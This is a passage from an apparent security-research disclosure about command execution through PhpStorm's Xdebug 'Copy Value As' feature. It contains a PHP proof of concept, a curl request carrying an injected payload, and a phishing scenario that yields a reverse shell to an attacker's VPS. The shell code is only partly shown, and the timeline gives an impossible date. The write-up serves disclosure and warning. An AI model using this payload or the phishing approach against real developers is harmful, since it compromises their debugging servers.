    $a = array();
    $q = $_GET['q'];
    $a['aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa'] = 'system';
    $b = "date >> /tmp/dawu";
    $a[$q] = "aaa";
    echo $a;
    ?>
When the element name is long enough, PhpStorm automatically hides the rest:
#### 2.2 Execute Commands via `Copy Value As`
Further research finds that `COPY VALUE AS (print_r/var_export/json_encode)`
also uses the `eval` command in Xdebug to implement the corresponding
functions:
Having carefully constructed the corresponding request and code, you can
execute the command on the Xdebug server again:
    curl "http://192.168.88.128/second_pwn.php?q=aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
    aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa%27%5d(\$b));%23" --cookie "XDEBUG_SESSION=PHPSTORM"
#### 2.3 Research on Actual Attacks
Based on the above research, I think PhpStorm can be used to implement
phishing attacks, and we suppose that the attack process is as follows:
  1. The attacker ensures that the victim can find malicious PHP files. For example, security researchers exchanged information about what the webshell actually implemented, and the operations staff found suspicious PHP files on the server.
  2. If the victim decides to use PhpStorm to analyze a PHP file after skimming through its contents.
  3. The victim uses `COPY VALUE AS (print_r/var_export/json_encode)`, `Evaluate array in Console`, etc., and the commands will be executed.
  4. The attacker can receive the `shell` from the victim's Xdebug server.
The carefully constructed code is as follows (the backconnected IP address is
the temporarily enabled VPS):
     $c,
        $f => $i,
        $g => $a,
    );
    $n[$e]($n[$g]($n[$f]));
    ?>
Executing this PHP code directly will only run `system("echo hello world;")`
multiple times. However, the debugger does not execute PHP code. He might
extract the value of `$n[$f]` and decode the specific content via `echo
XXXXXXXX|base64 -d`.
If he uses `COPY VALUE BY print_r` to copy the corresponding variable, the
command will be executed on his Xdebug server.
In the gif below, on the left is the attacker's terminal, and on the right is
the debugging session of the victim.
PS: A clerical error in the gif, “decise” should be “decide”.
### 0x03 Conclusion
In the whole process of vulnerability discovery, there are some twists and
turns, but it is just the fun of security research. It's a pity that PhpStorm
officials didn't finally acknowledge the vulnerability. The reason why I share
this discovery is to share the thoughts on the one hand; on the other hand,
it’s to remind the security researchers to use the `COPY VALUE AS
(print_r/var_export/json_encode)`, `Evaluate array in Console` functionality
when debugging code by means of PhpStorm with caution.
### 0x04 Timeline
June 8, 2018: `Evaluate in Console` was found to be at risk of executing the
command on the Xdebug server.
June 31, 2018 - July 1, 2018: Try to analyze the problems of `Evaluate in
Console` and find a new exploitation point: `Copy Value`. Even though eval is
a feature provided by Xdebug, PhpStorm does not filter single quotes so that
you can execute commands on the Xdebug server, so I contacted the official via
security@jetbrains.com.
July 4, 2018: I received an official reply saying that they don't provide
additional access to server's resources within debugging as it's being managed
by Xdebug.
July 6, 2018: Contact the official again to show that the attack can be used
for phishing attacks.
July 6, 2018: The official believed that having the untrusted code at the
server may compromise the server without PhpStorm involved. The Official
agreed with me to disclose the problem.
August 16, 2018: Disclose this issue.
### About Knownsec & 404 Team
Beijing Knownsec Information Technology Co., Ltd. was established by a group
of high-profile international security experts. It has over a hundred frontier
security talents nationwide as the core security research team to provide
long-term internationally advanced network security solutions for the
government and enterprises.
Knownsec's specialties include network attack and defense integrated
technologies and product R&D under new situations. It provides visualization
solutions that meet the world-class security technology standards and enhances
the security monitoring, alarm and defense abilities of customer networks with
its industry-leading capabilities in cloud computing and big data processing.
The company's technical strength is strongly recognized by the State Ministry
of Public Security, the Central Government Procurement Center, the Ministry of
Industry and Information Technology (MIIT), China National Vulnerability
Database of Information Security (CNNVD), the Central Bank, the Hong Kong
Jockey Club, Microsoft, Zhejiang Satellite TV and other well-known clients.
404 Team, the core security team of Knownsec, is dedicated to the research of
security vulnerability and offensive and defensive technology in the fields of
Web, IoT, industrial control, blockchain, etc. 404 team has submitted
vulnerability research to many well-known vendors such as Microsoft, Apple,
Adobe, Tencent, Alibaba, Baidu, etc. And has received a high reputation in the
industry.
The most well-known sharing of Knownsec 404 Team includes: [KCon Hacking
Conference](http://kcon.knownsec.com/#/ "KCon Hacking Conference"), [Seebug
Vulnerability Database](https://www.seebug.org/ "Seebug Vulnerability
Database") and [ZoomEye Cyberspace Search Engine](https://www.zoomeye.org/
"ZoomEye Cyberspace Search Engine").
* * *